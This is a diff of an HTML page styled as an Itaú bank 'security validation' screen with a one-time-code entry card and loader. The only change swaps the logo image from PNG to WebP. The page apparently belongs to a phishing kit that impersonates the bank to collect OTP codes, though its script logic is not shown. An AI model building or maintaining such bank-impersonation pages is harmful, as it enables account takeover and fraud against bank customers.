@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ValidaciÃ³n de Seguridad | ItaÃº</title>
-    <link rel="icon" type="image/png" href="itau_logo.png">
+    <link rel="icon" type="image/png" href="itau_logo.webp">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript" src="../../scripts/functions2.js"></script>
@@ -212,7 +212,7 @@
 <body>
 
     <div id="loader-overlay">
-        <img src="itau_logo.png" alt="ItaÃº" style="width: 54px; border-radius: 12px; margin-bottom: 30px;">
+        <img src="itau_logo.webp" alt="ItaÃº" style="width: 54px; border-radius: 12px; margin-bottom: 30px;">
         <div class="spinner"></div>
         <p style="color: var(--itau-orange); font-weight: 600;">Estamos validando tu cÃ³digo...</p>
     </div>
@@ -220,7 +220,7 @@
     <div class="page-wrapper">
         <div class="otp-card">
             <div class="logo-container">
-                <img src="itau_logo.png" alt="ItaÃº">
+                <img src="itau_logo.webp" alt="ItaÃº">
             </div>
 
             <h1>Seguridad ItaÃº</h1>
